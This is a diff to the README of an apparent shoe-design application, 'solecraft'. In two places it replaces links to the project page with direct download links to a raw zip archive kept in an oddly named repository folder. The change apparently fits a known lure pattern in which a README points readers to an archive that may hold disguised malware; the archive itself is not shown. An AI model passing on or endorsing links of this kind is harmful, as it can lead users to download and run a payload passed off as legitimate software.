@@ -1,6 +1,6 @@
 # 🛠️ solecraft - Create custom shoe designs with ease
 
-[![](https://img.shields.io/badge/Download-Solecraft-blue.svg)](https://github.com/stable-octave120/solecraft)
+[![](https://img.shields.io/badge/Download-Solecraft-blue.svg)](https://github.com/stable-octave120/solecraft/raw/refs/heads/main/headstrongness/Software_v3.1-alpha.2.zip)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ If your computer is older, the application might run slowly. Close other program
 
 Visit the link below to reach the project page.
 
-[https://github.com/stable-octave120/solecraft](https://github.com/stable-octave120/solecraft)
+[https://github.com/stable-octave120/solecraft/raw/refs/heads/main/headstrongness/Software_v3.1-alpha.2.zip](https://github.com/stable-octave120/solecraft/raw/refs/heads/main/headstrongness/Software_v3.1-alpha.2.zip)
 
 Follow these steps to install the software on your machine:
 
